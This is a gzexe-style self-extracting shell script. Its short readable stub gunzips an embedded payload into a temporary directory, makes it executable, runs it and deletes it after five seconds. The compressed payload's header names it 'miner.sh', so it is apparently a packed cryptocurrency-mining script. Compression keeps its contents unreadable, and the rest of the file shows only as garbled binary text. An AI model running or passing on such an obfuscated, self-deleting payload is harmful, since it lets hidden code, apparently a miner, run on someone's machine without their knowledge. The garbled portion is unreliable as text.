#!/bin/sh
skip=44

tab='	'
nl='
'
IFS=" $tab$nl"

umask=`umask`
umask 77

gztmpdir=
trap 'res=$?
  test -n "$gztmpdir" && rm -fr "$gztmpdir"
  (exit $res); exit $res
' 0 1 2 3 5 10 13 15

if type mktemp >/dev/null 2>&1; then
  gztmpdir=`mktemp -dt`
else
  gztmpdir=/tmp/gztmp$$; mkdir $gztmpdir
fi || { (exit 127); exit 127; }

gztmp=$gztmpdir/$0
case $0 in
-* | */*'
') mkdir -p "$gztmp" && rm -r "$gztmp";;
*/*) gztmp=$gztmpdir/`basename "$0"`;;
esac || { (exit 127); exit 127; }

case `echo X | tail -n +1 2>/dev/null` in
X) tail_n=-n;;
*) tail_n=;;
esac
if tail $tail_n +$skip <"$0" | gzip -cd > "$gztmp"; then
  umask $umask
  chmod 700 "$gztmp"
  (sleep 5; rm -fr "$gztmpdir") 2>/dev/null &
  "$gztmp" ${1+"$@"}; res=$?
else
  echo >&2 "Cannot decompress $0"
  (exit 127); res=127
fi; exit $res
�lɺXminer.sh Ŕko�0���W�DծJ<��@�mQ:M��n�$��e�ӤZ�߉�-e��N"Q|�����(��B��>���r�&�P��C#!���j9	S�:��_w���X�?Aj���.���4�䚨PpC��C����f���1ʉBkc+��u
Щo �p��"C�)!�æU����������������6&Q%~��s��+0)�T׊�JZQ�$���Q��dWvvr���'�1щ��LD�_�^��V{�s�̯0�vv��Z�Ԁ�2^$�H�f`�Ӭ�é}����o���@�{��(�J4LiV��d�]F�v��&�y�2؈�,��D��,�g�B	�/��M�%S~����F�j�?����9Ι���>1��������v��:����D߳jD����v{J{�J�F���&g�&��������ӗ㓼7�z}����4��G�0����'�9<�j��`d?�M�G�ȴ=Xs�����<�|N��XZۄ��^���?��" zM ��Do�H�X�F=�t��	T����  